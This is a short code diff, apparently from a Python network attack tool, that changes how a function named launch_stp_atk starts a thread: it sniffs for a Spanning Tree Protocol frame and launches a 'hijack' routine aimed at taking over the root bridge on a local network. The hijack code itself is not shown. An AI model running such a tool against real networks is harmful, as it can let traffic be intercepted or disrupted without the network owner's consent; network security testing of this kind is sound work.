@@ -61,7 +61,7 @@ def hijack(event, interfaces, pkt):
 
 def launch_stp_atk(interfaces):
     pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interfaces)
-    stp_thread = threading.Thread(target=hijack_root_bridge.hijack, args=(stop_hijack_event, interfaces, pkt,))
+    stp_thread = threading.Thread(target=hijack, args=(stop_hijack_event, interfaces, pkt,))
     stp_thread.daemon = True
     stp_thread.start()
 
